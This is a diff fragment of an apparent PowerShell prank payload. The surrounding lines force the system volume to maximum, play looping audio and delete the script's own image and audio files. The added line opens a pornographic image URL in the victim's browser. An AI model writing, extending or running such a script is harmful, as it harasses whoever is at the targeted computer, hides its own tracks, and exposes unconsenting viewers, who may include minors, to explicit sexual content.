@@ -97,6 +97,7 @@ $player.PlayLooping()
 1..10000 | % {(new-object -com wscript.shell).SendKeys([char]175)}
 Remove-Item $imgPath -ErrorAction Ignore
 Remove-Item $audiopath -ErrorAction Ignore
+start https://us.rule34.xxx//samples/5715/sample_bed5399ffa18491cc1898587e3313c0063c53fa6.jpg?6497640
 Start-Sleep -Seconds 3
 exit
 
